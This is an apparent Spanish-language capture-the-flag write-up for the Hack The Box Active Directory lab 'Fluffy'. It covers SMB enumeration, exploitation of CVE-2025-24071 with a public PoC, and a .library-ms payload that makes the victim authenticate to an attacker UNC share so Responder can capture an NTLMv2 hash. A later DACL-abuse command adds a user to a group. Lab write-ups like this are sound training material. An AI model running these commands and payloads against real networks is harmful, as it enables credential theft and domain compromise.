#ActiveDirectory #windows #Easy 
# MACHINE INFORMATION

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
### ping

```python
❯ ping -c 1 10.10.11.69
PING 10.10.11.69 (10.10.11.69) 56(84) bytes of data.
64 bytes from 10.10.11.69: icmp_seq=1 ttl=127 time=129 ms

--- 10.10.11.69 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 128.552/128.552/128.552/0.000 ms
```

### nmap

```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-28 22:24:39Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-28T22:25:26
|_  start_date: N/A
|_clock-skew: 6h59m58s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 28 10:26:37 2025 -- 1 IP address (1 host up) scanned in 193.77 seconds
```

### Enumeración SMB 

### Rid-Brute

```python
❯ crackmapexec smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --rid-brute
```

![[Pasted image 20250528120635.png]]

Usando la --shares, enumeramos los derechos de acceso a los recursos compartidos SMB disponibles

```python
❯ nxc smb dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

![[Pasted image 20250528121206.png]]

Confirmamos el acceso de lectura y escritura a un recurso compartido personalizado llamado IT y descargamos todo con ==mget * .== 

![[Pasted image 20250528122155.png]]

el documento pdf hace referencia a algunos CVS conocidos que están parchados o que serán parchados próximamente
![[Pasted image 20250528122746.png]]

Este KeePass.exe.configarchivo es un archivo de configuración de aplicación .NET estándar, pero no expone las credenciales directamente.

![[Pasted image 20250528123035.png]]

  Sin embargo, esta línea en KeePass.exe.config: 

```python
xml
<loadFromRemoteSources enabled="true" />
```


…instruye al entorno de ejecución .NET para permitir la carga de ensamblados (DLL) desde ubicaciones remotas , incluidas: Rutas UNC ( \\attacker\share\malicious.dll) Unidades mapeadas Incluso ubicaciones basadas en la web (en versiones anteriores o casos mal configurados)

Normalmente, esto estaría bloqueado por la política de seguridad de .NET , a menos que esté permitido explícitamente como aquí. Esta configuración es una señal de alerta importante cuando un usuario extrae y ejecuta KeePass.exe desde un archivo ZIP, donde tenemos acceso de escritura . Esto sugiere claramente que el entorno está preparado para cargar algo desde una ubicación remota, un punto de partida clásico para el phishing de intranet mediante trucos de rutas SMB , señuelos de suplantación de identidad o cargas útiles de phishing enviadas mediante referencias a recursos compartidos de intranet . 

### CVE-2025-24071 Descripción general

Entre los CVE revelados en el PDF, el CVE-2025-24071 destaca por ser una coincidencia precisa con la configuración actual. Es un CVE reciente (si no recuerdo mal, hace unos meses leí el [[https://cti.monster/blog/2025/03/18/CVE-2025-24071.html]] CVE-2025-24071 es una vulnerabilidad de suplantación de identidad (spoofing) en el Explorador de archivos de Windows que permite a los atacantes capturar hashes NTLM con mínima interacción del usuario. La falla surge del procesamiento automático de .library-msarchivos del Explorador de archivos, que están basados ​​en XML y definen ubicaciones de bibliotecas.

### Suplantación de identidad (phishing) 
Primero, creamos el arma usando el repositorio PoC CVE-2025-24071 (o creamos uno manualmente, lo cual es bastante sencillo). Esto genera un .library-msarchivo diseñado para provocar la autenticación SMB en nuestro servidor controlado:

1. clonamos el repositorio
2. creamos un entorno virtual en python para poder operar de forma segura
3. activamos el entorno 
4. instalamos los requierements
5. ejecutamos el exploit


```python
❯ git clone https://github.com/ThemeHackers/CVE-2025-24071.git

❯ python3 -m venv venv

❯ source venv/bin/activate

❯ pip install -r requirements.txt

❯ python exploit.py -f Microsoft -i $10.10.14.133
```

![[Pasted image 20250528130756.png]]

esto creara un archivo xml parecido a este 

```python
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
  <url>\\10.10.45.11\shared</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

El payload está dentro exploit.zip. ahora vamos a montar el recurso compartido y vamos a tener nuestro responder a la escucha

```python
❯ sudo mount -t cifs \
  //dc01.fluffy.htb/IT /mnt/ \
  -o username='j.fleischman',password='J0elTHEM4n1990!',domain='fluffy.htb'

❯ sudo cp exploit.zip /mnt/
```

![[Pasted image 20250528133557.png]]

### Hashcat 
La trampa activó el sistema y Responder capturó un hash NTLMv2 activo FLUFFY\p.agila

![[Pasted image 20250528135043.png]]

### bloodhound-python
ya que tenemos credenciales validas vamos a recopilar datos del Active Directory

![[Pasted image 20250528140513.png]]

### Abuso de DACL
en este punto deberías ver solo una conexión entre nuestro usuario "P.AGILA" y el grupo de "Service Account Manager" pero ya alguien mas ha agregado a P.AGILA al grupo de "Service Account" pero nosotros haremos todo el recorrido como si este paso no existiera. en este caso el bloodhound nos da un comando para poder realizar este ataque. pero yo utilizare la herramienta "certipy-ad"

```python
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

![[Pasted image 20250528183244.png]]

sincronizamos la hora del servidor y extraemos credenciales

![[Pasted image 20250528192546.png]]

solicitud de TGT

![[Pasted image 20250528194216.png]]

Autenticación con Certipy usando certificado `.pfx` del administrador

![[Pasted image 20250528194719.png]]

### WE ARE ROOT
